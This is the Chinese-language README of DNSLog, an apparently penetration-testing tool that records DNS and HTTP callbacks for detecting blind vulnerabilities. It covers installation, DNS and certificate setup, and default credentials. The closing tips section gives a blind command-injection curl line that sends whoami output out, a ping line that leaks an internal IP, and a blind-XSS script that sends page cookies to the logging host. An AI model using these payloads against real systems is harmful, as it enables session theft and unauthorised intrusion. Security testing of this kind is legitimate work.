```
 ____  _   _ ____  _
|  _ \| \ | / ___|| |    ___   __ _
| | | |  \| \___ \| |   / _ \ / _` |
| |_| | |\  |___) | |__| (_) | (_| |
|____/|_| \_|____/|_____\___/ \__, |
                              |___/
```
[![Python 2.6|2.7](https://img.shields.io/badge/python-2.6|2.7-yellow.svg)](https://www.python.org/)   [![License](https://img.shields.io/badge/license-GPLv2-red.svg)](https://raw.githubusercontent.com/BugScanTeam/dnslog/master/GPL-2.0) 

简介
---

DNSLog 是四叶草安全旗下 BugscanTeam 打造的一款监控 DNS 解析记录和 HTTP 访问记录的工具，在检测盲注类漏洞时有着非常重要的作用，是分布式漏洞扫描框架 BugScan 中核心库之一。

DNSLog 基于 Django 框架编写，将 DNSServer 集成进 DNSLog 中，使用者可轻松搭建使用环境。

你可以点击这里访问： [演示站点](https://admin.dnslog.link)

安装
---

1. 获取源代码

 你可以通过用 Git 来克隆代码仓库中的最新源代码

 ```
 $ git clone git@github.com:BugScanTeam/DNSLog.git
 ```

 或者你可以点击 [这里](https://github.com/BugScanTeam/DNSLog/archive/master.zip) 下载最新的源代码 zip 包,并解压

 ```
 $ wget https://github.com/BugScanTeam/DNSLog/archive/master.zip
 $ unzip master.zip
 ```

2. 安装依赖环境

 DNSLog 使用前需要安装 Django 1.8 与 dnslib ，如果已经安装可跳过此步

 ```
 $ cd dnslog
 $ pip install -r requirements.pip
 ```
3. 域名与公网 IP 准备
    
    搭建并使用 DNSLog，你需要拥有两个域名，一个域名作为 NS 服务器域名(例:a.com)，一个用于记录域名(例: b.com)。还需要有一个公网 IP 地址(如：1.1.1.1)
    
    **注意：b.com 的域名提供商需要支持自定义 NS 记录, a.com 则无要求。**
    
    1. 在 a.com 中设置两条 A 记录：

        ```
        ns1.a.com  A 记录指向  1.1.1.1        
        ns2.a.com  A 记录指向  1.1.1.1
        ```
    2. 修改 b.com 的 NS 记录为 1 中设定的两个域名

        > 本步骤中，需要在域名提供商提供的页面进行设置，部分域名提供商只允许修改 NS 记录为已经认证过的 NS 地址。所以需要找一个支持修改 NS 记录为自己 NS 的域名提供商。
    
    **注意: NS 记录修改之后部分地区需要 24-48 小时会生效**

4. 修改配置文件
    
 修改 `dnslog/dnslog/settings.py` 文件中相关配置：
 
 > 配置文件中的域名对应关系与步骤 3 相同
 
 ```
    # 做 dns 记录的域名
    DNS_DOMAIN = 'b.com'
    
    # 记录管理的域名, 这里前缀根据个人喜好来定
    ADMIN_DOMAIN = 'admin.b.com'
    
    # NS域名
    NS1_DOMAIN = 'ns1.a.com'
    NS2_DOMAIN = 'ns2.a.com'
    
    # 服务器外网地址
    SERVER_IP = '1.1.1.1'
 ```

5. 启动服务

 ```
 $ cd dnslog/
 $ sudo python manage.py runserver 0.0.0.0:80
 ```
 
 **Django web 默认启动端口为 8000，若要启动在 80 端口则需要 root 权限**
 
 > 如果不想启动在 80 端口，但又想在使用 HTTP 的时候不加端口号，可以自己安装 Nginx，对 b.com 做反向代理
 
 Nginx 反向代理参考脚本：
 
```nginx
server {
        listen 443;
        ssl on;
        ssl_certificate /etc/nginx/certs/*.xxx.com/fullchain;
        ssl_certificate_key /etc/nginx/certs/*.xxx.com/key;
        server_name *.hackhttp.com;
        location /static {
                alias /var/www/dnslog/static;
        }
        location / {
                proxy_pass http://127.0.0.1:8000/;
                proxy_redirect off;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $remote_addr;
                proxy_set_header X-Forwarded-Proto $scheme;
        }

}
```

6. https泛证书申请(let's encrypt)

    1. 安装acme `curl  https://get.acme.sh | sh`
    1. 单独启动dns服务器 `python zoneresolver.py`
    1. 添加acme的api脚本
        ```bash
        cp acme.sh/dns_log.sh /root/.acme.sh/dnsapi/dns_log.sh
        chmod +x /root/.acme.sh/dnsapi/dns_log.sh
        ```
    1. 申请证书

        `acme.sh --issue -d "*.xxx.com" --dns dns_log --debug --dnssleep 10`

    1. 安装证书

        ```bash
        mkdir -p /etc/nginx/certs/\*.xxx.com/
        acme.sh --install-cert -d \*.xxx.com \
        --cert-file /etc/nginx/certs/\*.xxx.com/cert \
        --key-file /etc/nginx/certs/\*.xxx.com/key \
        --fullchain-file /etc/nginx/certs/\*.xxx.com/fullchain \
        --reloadcmd "nginx -s reload"
        ```

    acme会自动检查证书是否过期，当申请到新证书后也会自动重启nginx让证书生效

---

### 站点管理

 启动服务成功后，访问 `http://b.com/admin/` 进入后台
 
 > 管理员用户名密码默认均为 admin
 
 如果忘记管理员密码，可进入 dnslog 目录下，执行如下命令重设管理员密码
 
 ```
 python manage.py changepassword admin 
 ```

### 普通用户

 在 User 表中添加使用用户的信息，表中默认已经存在 `test/123456` 这个用户。
 
 访问 `http://admin.b.com` (ADMIN_DOMAIN 指定的域名)，输入用户名密码登录。
 
 访问后会在下方看到自己的二级域名，例如 test.b.com，当请求 test.b.com 这个二级域名下的任意子域时，都会被记录，例如: demo.test.b.com。

使用技巧
---

### 命令盲注利用

对于一些命令盲注类的漏洞，可以通过 DNSLog 中的 WebLog 部分将其转化为有回显的命令执行：

```
curl "http://testhash.test.dnslog.link/?`whoami`"
```

**在 Web 控制台下看到结果：**

\#    |    path    |    ip    |    ua    | date
---|---|---|---|---
146    | testhash.test.dnslog.link/?root |    xxx.xxx.xxx.xxx |    curl/7.43.0    | 2016-05-10 07:36:47


### DNS记录中获取源IP地址

详见 [issue#3](https://github.com/BugScanTeam/DNSLog/issues/3)

```
ping -c 3 `ifconfig en0|grep "inet "|awk '{print $2}'`.test.dnslog.link
```

效果如下：

```
➜  ~ ping -c 3 `ifconfig en0|grep "inet "|awk '{print $2}'`.test.dnslog.link
PING 192.168.10.167.test.dnslog.link (106.186.118.146): 56 data bytes
64 bytes from 106.186.118.146: icmp_seq=0 ttl=52 time=259.491 ms
64 bytes from 106.186.118.146: icmp_seq=1 ttl=52 time=307.566 ms
64 bytes from 106.186.118.146: icmp_seq=2 ttl=52 time=352.757 ms

--- 192.168.10.167.test.dnslog.link ping statistics ---
3 packets transmitted, 3 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 259.491/306.605/352.757/38.082 ms
```

### XSS 盲打

在有 XSS 漏洞的页面加入类似如下代码：

```
var s=document.createElement('img');
s.src="http://xss.test.dnslog.link/?url="+document.location+"&cookie="+document.cookie;
document.head.appendChild(s);
```

以 `httpbin.org` 为例，一旦触发，在 WebLog 中可以看到：

\#    |    path    |    ip    |    ua    | date
---|---|---|---|---
146    | xss.test.dnslog.link/?url=http://httpbin.org/&cookie=_ga=GA1.2.17.142 |    xxx.xxx.xxx.xxx |    Mozilla/5.0 xxx    | 2016-06-18


相关链接
---

* [版权声明](./GPL-2.0)
* [BugScan 社区官网](http://www.bugscan.net)
* [DNSLog 示例站点](http://admin.dnslog.link/)
